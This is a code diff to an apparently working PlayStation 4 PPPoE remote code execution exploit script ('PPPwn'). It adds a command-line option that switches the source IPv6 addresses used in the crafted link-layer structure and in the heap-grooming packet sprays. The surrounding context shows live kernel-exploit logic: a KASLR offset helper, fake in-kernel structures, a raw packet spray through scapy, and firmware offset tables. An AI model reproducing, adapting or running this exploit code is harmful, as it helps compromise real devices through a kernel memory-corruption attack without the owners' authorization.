@@ -165,16 +165,19 @@ class Exploit():
 
     SOURCE_MAC = '41:41:41:41:41:41'
     SOURCE_IPV4 = '192.168.2.1'
-    SOURCE_IPV6 = 'fe80::9f9f:41ff:9f9f:41ff'
-
     TARGET_IPV4 = '192.168.2.2'
-
     BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'
 
-    def __init__(self, offs, iface):
+    def __init__(self, offs, iface, sipv):
         self.offs = offs
         self.iface = iface
+        self.sipv = sipv
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
+        
+        if sipv == "1":
+            self.SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'
+        else:
+            self.SOURCE_IPV6 = 'fe80::9f9f:41ff:9f9f:41ff'
 
     def kdlsym(self, addr):
         return self.kaslr_offset + addr
@@ -456,7 +459,11 @@ class Exploit():
         fake_lle += p32(0)  # sin6_flowinfo
         # sin6_addr
         fake_lle += p64be(0xfe80000100000000)
-        fake_lle += p64be(0x9f9f41ff9f9f41ff)
+        if self.sipv == "1":
+            fake_lle += p64be(0x4141414141414141)
+        else:
+            fake_lle += p64be(0x9f9f41ff9f9f41ff)
+        
         fake_lle += p32(0)  # sin6_scope_id
 
         # pad
@@ -614,6 +621,7 @@ class Exploit():
 
         print('')
         print('[+] STAGE 0: Initialization')
+        print('[+] Source IPv6:',self.SOURCE_IPV6)
 
         self.ppp_negotation(self.build_fake_ifnet)
         self.lcp_negotiation()
@@ -632,8 +640,12 @@ class Exploit():
             if i % 0x100 == 0:
                 print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
 
-            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
-
+            if self.sipv == "1":
+                source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            else:
+                source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
+            
+            
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
                 IPv6(src=source_ipv6, dst=self.target_ipv6) /
@@ -712,7 +724,11 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
+            if self.sipv == "1":
+                source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            else:
+                source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
+
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -827,6 +843,7 @@ def main():
                             '1100'
                         ],
                         default='1100')
+    parser.add_argument('--ipv', default='0')
     args = parser.parse_args()
 
     print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow')
@@ -853,7 +870,7 @@ def main():
     elif args.fw == '1100':
         offs = OffsetsFirmware_1100()
 
-    exploit = Exploit(offs, args.interface)
+    exploit = Exploit(offs, args.interface, args.ipv)
     exploit.run()
 
     return 0
